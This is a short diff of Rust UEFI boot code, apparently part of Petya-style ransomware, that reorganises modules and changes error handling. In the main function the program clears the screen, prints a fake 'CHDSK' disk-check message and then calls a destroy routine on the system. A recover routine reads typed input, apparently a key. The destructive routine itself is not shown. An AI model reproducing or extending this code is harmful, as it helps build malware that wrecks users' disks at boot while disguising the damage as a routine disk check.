@@ -14,15 +14,14 @@ use uefi::proto::console::text::{Color, Key};
 use uefi::table::runtime::ResetType;
 use uefi::{Char16, Event};
 
-use crate::efi_vars::read_var;
-use crate::ntfs::destroy;
+use crate::efi::read_var;
+use crate::destroy::destroy;
 use crate::recover::recover;
 
-mod efi_rng;
-mod efi_vars;
-mod file;
-mod ntfs;
+mod destroy;
 mod recover;
+mod efi;
+mod ntfs;
 
 fn init_chdsk_screen(st: &mut SystemTable<Boot>) -> uefi::Result {
     st.stdout().clear()?;
@@ -70,7 +69,7 @@ fn take_input(
                     Some(&[]),
                 );
             } else {
-                recover(&mut st, buffer.as_bytes())?;
+                recover(&mut st, buffer.as_bytes()).unwrap();
                 stdout.write_str("\n> ").unwrap();
                 buffer.clear();
             }
@@ -126,7 +125,6 @@ fn main(_handle: Handle, mut st: SystemTable<Boot>) -> Status {
             // Print CHDSK message
             init_chdsk_screen(&mut st)?;
 
-            // Speak for it self
             match destroy(&st) {
                 Ok(_) => {}
                 Err(e) => {
